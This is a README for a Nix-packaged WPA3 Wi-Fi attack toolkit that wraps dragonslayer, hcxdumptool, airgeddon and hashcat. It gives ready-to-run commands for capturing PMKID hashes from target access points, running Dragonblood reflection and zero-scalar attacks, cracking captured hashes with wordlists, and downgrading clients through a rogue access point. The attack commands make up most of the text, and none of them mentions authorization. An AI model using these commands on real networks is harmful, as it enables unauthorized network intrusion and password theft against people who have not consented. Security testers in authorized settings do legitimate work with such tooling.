# wpa3-attack

WPA3/SAE attack testing using [dragonslayer](https://github.com/vanhoefm/dragonslayer)
(Dragonblood SAE attacks), [hcxdumptool](https://github.com/ZerBea/hcxdumptool)
(PMKID capture) and [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
(interactive WPA3 attack menu).

## Prerequisites

- Root privileges
- A wireless adapter that supports monitor mode (see `check-monitor-mode`)
- For `dragonslayer-run`: update the two placeholder hashes in `flake.nix` first
  (see [Dragonblood setup](#dragonblood-setup) below)

## Tools exposed

| Command | Description |
|---|---|
| `nix run .` | `wpa3-attack` - scan or PMKID capture |
| `nix run .#dragonslayer` | `dragonslayer-run` - SAE Dragonblood attacks |
| `nix run .#airgeddon` | airgeddon - interactive WPA3 attack menu |
| `nix develop` | Dev shell with the full toolset |

## WPA3 attack (automated)

### Usage

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' . -- <interface> [bssid] [output-dir]
```

| Argument | Required | Description |
|---|---|---|
| `interface` | yes | Wireless interface to use |
| `bssid` | no | Target a specific AP; omit to target all WPA3 APs |
| `output-dir` | no | Directory for captures and results (default: current dir) |

### Environment variables

| Variable | Default | Description |
|---|---|---|
| `WPA3_MODE` | `pmkid` | Mode: `scan` or `pmkid` |
| `PMKID_TIMEOUT` | `150` | Seconds to run the capture |
| `WORDLIST` | - | Path to wordlist; enables immediate cracking after capture |

### Modes

**`scan`** - identify WPA3 APs and their transition mode status:

```bash
WPA3_MODE=scan sudo nix run . --extra-experimental-features 'nix-command flakes' -- client wlp196s0f3u1
```

Output shows whether each AP is `SAE-only (WPA3)` or `Transition (WPA3+WPA2)`.
Transition-mode APs also accept WPA2 connections - use the `wpa/` flake against
those for a faster attack path.

**`pmkid`** - capture PMKID/EAPOL hashes with hcxdumptool:

```bash
sudo nix run . --extra-experimental-features -- wlan1
sudo nix run . --extra-experimental-features -- wlan1 AA:BB:CC:DD:EE:FF /tmp/wpa3
WORDLIST=/path/to/rockyou.txt sudo nix run . --extra-experimental-features -- wlan1 AA:BB:CC:DD:EE:FF
```

Captured hashes are written to a `.pmkid` file and cracked with
`hashcat -m 22000` if `WORDLIST` is set. WPA3 transition networks use the same
PMKID mechanism as WPA2, so this works without modification.

## dragonslayer-run (SAE Dragonblood attacks)

Implements Vanhoef's Dragonblood side-channel attacks against WPA3-SAE.

### Dragonblood setup

```bash
nix build --extra-experimental-features .#dragonslayer 2>&1 | grep 'got:'
```

### Usage

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' .#dragonslayer -- <interface> <bssid> <attack>
```

| Attack | Type | Target |
|---|---|---|
| `0` | Reflection attack | SAE and EAP-pwd |
| `1` | Invalid curve attack | EAP-pwd only |
| `3` | Zero-scalar attack | WPA3 SAE |

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' .#dragonslayer -- wlan1 AA:BB:CC:DD:EE:FF 0
sudo nix run --extra-experimental-features 'nix-command flakes' .#dragonslayer -- wlan1 AA:BB:CC:DD:EE:FF 3
```

The interface must already be in monitor mode before running dragonslayer.

## airgeddon (interactive)

`airgeddon` provides an interactive WPA3 attack menu with downgrade attacks,
Management Frame Protection analysis and plugin support for additional modules.

```bash
sudo nix run --extra-experimental-features 'nix-command flakes' .#airgeddon
```

Relevant menu path:

```text
9) WPA3 attacks menu
  → 1) WPA3 downgrade attack
  → 2) WPA3 MFP check
  → 3) Plugins (dragon-drain, cookie-guzzler)
```

## Dev shell

```bash
nix develop
```

Available: `aircrack-ng`, `airgeddon`, `hashcat`, `hashcat-utils`,
`hcxdumptool`, `hcxtools`, `hostapd`, `hostapd-mana`, `iw`.

Crack captured hashes manually:

```bash
# from a .pmkid file produced by WPA3 attack
hashcat -m 22000 capture.pmkid /path/to/wordlist.txt

# GPU-accelerated with rules
hashcat -m 22000 -r /path/to/rules/best64.rule capture.pmkid wordlist.txt
```

## Notes

- WPA3-Transition mode is the most common deployment. Those APs accept WPA2
  alongside WPA3, so a WPA2 PMKID/handshake attack from the `wpa/` flake will
  succeed without needing Dragonblood tooling.
- WPA3-SAE-only APs require either Dragonblood side-channel attacks
  (dragonslayer) or a dictionary attack against the SAE commit frames captured
  by hcxdumptool.
- `hostapd-mana` in the dev shell can be used to set up a rogue AP that
  advertises only WPA2, forcing transition-mode clients to downgrade.
